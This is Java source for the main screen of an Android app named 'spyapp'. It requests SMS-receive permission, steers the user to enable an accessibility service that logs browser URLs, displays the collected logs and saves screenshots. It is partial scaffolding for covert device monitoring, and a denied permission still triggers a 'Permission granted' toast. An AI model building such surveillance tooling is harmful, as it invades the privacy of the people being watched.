package com.extrainch.spyapp;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.text.TextUtils;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;

public class MainActivity extends AppCompatActivity {
    private TextView mStatus;
    private TextView mLogs;
    private Button btnSet, button2;
    public static String strLogs = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS}, 1000);
        }

        btnSet = (Button) findViewById(R.id.button);
        mStatus = (TextView) findViewById(R.id.textView);
        mLogs = (TextView) findViewById(R.id.textView3);
        button2 = (Button) findViewById(R.id.button2);
        btnSet.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            //   Uri uri = Uri.fromParts("package", getPackageName()+"/"+getPackageName()+".NotificationListener", null);
            //  intent.setData(uri);
            startActivity(intent);
        });
        button2.setOnClickListener(v -> screenshot());
        DoInit();
    }

    //readsms start
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 1000) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Permission granted", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "Permission granted", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }
    //readsms end

    //browser log start
    public static void onBrowserRecv(String str) {
        strLogs += str + "\r\n\r\n";
    }

    void DoInit() {
        boolean bset = isAccessibilitySettingsOn(this);
        if (bset == true) {
            btnSet.setEnabled(false);
            mStatus.setText("Permission Granted");
        } else {
            btnSet.setEnabled(true);
            mStatus.setText("Permission Pending");
        }
    }

    @Override
    protected void onResume() {
        DoInit();
        if (mLogs != null) {
            mLogs.setText(strLogs);
            mLogs.setMovementMethod(new ScrollingMovementMethod());
        }
        super.onResume();
    }

    private boolean isAccessibilitySettingsOn(Context mContext) {
        int accessibilityEnabled = 0;
        final String service = getPackageName() + "/" + LogUrlService.class.getCanonicalName();
        try {
            accessibilityEnabled = Settings.Secure.getInt(
                    mContext.getApplicationContext().getContentResolver(),
                    android.provider.Settings.Secure.ACCESSIBILITY_ENABLED);
        } catch (Settings.SettingNotFoundException e) {
            e.printStackTrace();
        }
        TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');

        if (accessibilityEnabled == 1) {
            String settingValue = Settings.Secure.getString(
                    mContext.getApplicationContext().getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (settingValue != null) {
                mStringColonSplitter.setString(settingValue);
                while (mStringColonSplitter.hasNext()) {
                    String accessibilityService = mStringColonSplitter.next();

                    if (accessibilityService.equalsIgnoreCase(service)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
    //browser log end //

    //screenshot start
    private void screenshot() {
        Date date = new Date();
        CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
//        String filename = Environment.getExternalStorageDirectory(Environment.DIRECTORY_DOWNLOADS) + "/spyapp" + now + ".jpg";
        java.io.File filename = new java.io.File((MainActivity.this.getApplicationContext().getFileStreamPath("spyapp" + now +".jpg").getPath()));
        View root = getWindow().getDecorView();
        root.setDrawingCacheEnabled(true);
        Bitmap bitmap = Bitmap.createBitmap(root.getDrawingCache());
        root.setDrawingCacheEnabled(false);

        File file = new File(String.valueOf(filename));
        file.getParentFile().mkdirs();

        try {
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, fileOutputStream);
            fileOutputStream.flush();
            fileOutputStream.close();

            Uri uri = Uri.fromFile(file);
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(uri, "image/*");
            startActivity(intent);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
